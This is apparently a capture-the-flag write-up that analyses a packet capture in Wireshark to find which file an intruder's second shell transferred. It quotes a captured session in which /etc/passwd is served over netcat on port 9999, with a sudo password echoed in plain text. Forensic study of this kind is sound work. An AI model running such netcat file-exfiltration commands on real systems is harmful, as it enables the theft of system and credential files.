# Exif (75)
`File shell.pcapng What file is added to the second shell`

We know from other challanges the answer but, `Statistics -> Conversations` then the TCP tab, looking at the conversation for port `4444`:
```
jtomato@ns01:~$ echo "*umR@Q%4V&RC" | sudo -S nc -nvlp 9999 < /etc/passwd
echo "*umR@Q%4V&RC" | sudo -S nc -nvlp 9999 < /etc/passwd
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 192.168.2.244 34972 received!
jtomato@ns01:~$ exit
exit
exit
```
Looking at port `9999` we can also see the file, which we can confirm is the /etc/passwd file